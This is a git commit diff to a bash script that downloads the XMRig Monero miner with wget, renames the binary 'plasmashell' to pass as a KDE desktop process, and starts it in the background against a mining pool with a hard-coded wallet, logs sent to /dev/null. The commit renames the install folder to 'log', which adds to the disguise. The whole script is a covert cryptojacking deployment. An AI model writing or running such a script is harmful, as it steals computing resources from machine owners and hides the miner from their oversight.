0fe39407ed2609c9781b03ed06134691abf400f1
hakumlk <ivanko12240@gmail.com>
2026-04-09 23:01:15 +0300

    Update script.sh

--- script.sh
+++ script.sh
@@ -1,6 +1,6 @@
 #!/bin/bash
 
-DIR="/home/devsky/1211/test"
+DIR="/home/DATA/1211/test"
 START="./plasmashell -o pool.hashvault.pro:443 -u 85WG1D3CVTYKPTxE4kQdHFJgghnHGqeiVKPnS8SzX6d9bZs8GyASnuZWRhQB14YTi2YiakQWh4QLjSJ1roqEBhbC17SDis3 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 --pass=$(hostname -s 2>/dev/null) --background --no-color --log-file /dev/null &"
 
 if [[ ! -d "$DIR" ]]; then
@@ -9,14 +9,14 @@ if [[ ! -d "$DIR" ]]; then
   wget -q https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-linux-static-x64.tar.gz
   tar -xzf xmrig-6.26.0-linux-static-x64.tar.gz
   rm -f xmrig-6.26.0-linux-static-x64.tar.gz
-  mv xmrig-6.26.0 1
-  cd 1
+  mv xmrig-6.26.0 log
+  cd log
   mv xmrig plasmashell
   chmod +x plasmashell
   $START
 
 else
-  cd "${DIR}/1"
+  cd "${DIR}/log"
   $START
 
 fi
